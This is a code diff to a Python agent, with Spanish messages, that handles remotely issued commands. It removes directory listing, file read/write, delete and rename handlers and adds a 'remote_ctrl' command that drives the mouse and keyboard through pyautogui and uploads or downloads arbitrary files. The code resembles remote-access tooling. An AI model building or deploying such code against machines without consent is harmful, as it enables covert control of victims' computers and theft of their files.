@@ -19,6 +19,7 @@ import socket
 import os
 import json
 import base64
+import pyautogui
 import tempfile
 import subprocess
 import getpass
@@ -186,86 +187,26 @@ async def handle_command(payload):
             "data": {"host": HOSTNAME, "user": getpass.getuser(), "cwd": os.getcwd()},
         }
 
-    elif cmd == "listdir":
-        path = args.get("path", "C:\\")
-        try:
-            entries = []
-            for f in os.listdir(path):
-                full = os.path.join(path, f)
-                entries.append({"name": f, "is_dir": os.path.isdir(full)})
-            return {"ok": True, "entries": entries}
-        except Exception as e:
-            return {"ok": False, "msg": str(e)}
-
-    elif cmd == "listdir":
-        path = args.get("path")
-        if not path or not os.path.exists(path):
-            return {"ok": False, "msg": f"Ruta inválida: {path}"}
-        try:
-            items = []
-            for entry in os.listdir(path):
-                full = os.path.join(path, entry)
-                items.append(
-                    {
-                        "name": entry,
-                        "is_dir": os.path.isdir(full),
-                        "size": os.path.getsize(full) if os.path.isfile(full) else 0,
-                    }
-                )
-            return {"ok": True, "data": {"path": path, "items": items}}
-        except Exception as e:
-            return {"ok": False, "msg": str(e)}
-
-    elif cmd == "getfile":
-        path = args.get("path")
-        if not path or not os.path.isfile(path):
-            return {"ok": False, "msg": "Archivo no válido"}
-        try:
-            with open(path, "rb") as f:
-                data = f.read()
-            import base64
-
-            return {"ok": True, "data": base64.b64encode(data).decode()}
-        except Exception as e:
-            return {"ok": False, "msg": str(e)}
-
-    elif cmd == "putfile":
-        path = args.get("path")
-        content = args.get("content")
-        if not path or not content:
-            return {"ok": False, "msg": "Parámetros faltantes"}
-        try:
-            import base64
-
-            with open(path, "wb") as f:
+    elif cmd == "remote_ctrl":
+        action = args.get("action")
+        if action == "mouse_move":
+            x, y = args.get("x"), args.get("y")
+            pyautogui.moveTo(x, y)
+        elif action == "mouse_click":
+            pyautogui.click()
+        elif action == "key":
+            pyautogui.press(args.get("key"))
+        elif action == "upload_file":
+            filepath = args.get("path")
+            content = args.get("content")  # base64 encoded
+            with open(filepath, "wb") as f:
                 f.write(base64.b64decode(content))
-            return {"ok": True, "msg": "Archivo escrito"}
-        except Exception as e:
-            return {"ok": False, "msg": str(e)}
+        elif action == "download_file":
+            filepath = args.get("path")
+            with open(filepath, "rb") as f:
+                data = base64.b64encode(f.read()).decode()
+            return {"ok": True, "data": data}
 
-    elif cmd == "delete":
-        path = args.get("path")
-        if not path or not os.path.exists(path):
-            return {"ok": False, "msg": "Archivo o carpeta no existe"}
-        try:
-            if os.path.isdir(path):
-                shutil.rmtree(path)
-            else:
-                os.remove(path)
-            return {"ok": True, "msg": "Eliminado correctamente"}
-        except Exception as e:
-            return {"ok": False, "msg": str(e)}
-
-    elif cmd == "rename":
-        src = args.get("src")
-        dst = args.get("dst")
-        if not src or not dst or not os.path.exists(src):
-            return {"ok": False, "msg": "Rutas inválidas"}
-        try:
-            os.rename(src, dst)
-            return {"ok": True, "msg": "Renombrado correctamente"}
-        except Exception as e:
-            return {"ok": False, "msg": str(e)}
 
     else:
         return {"ok": False, "msg": "Comando desconocido"}
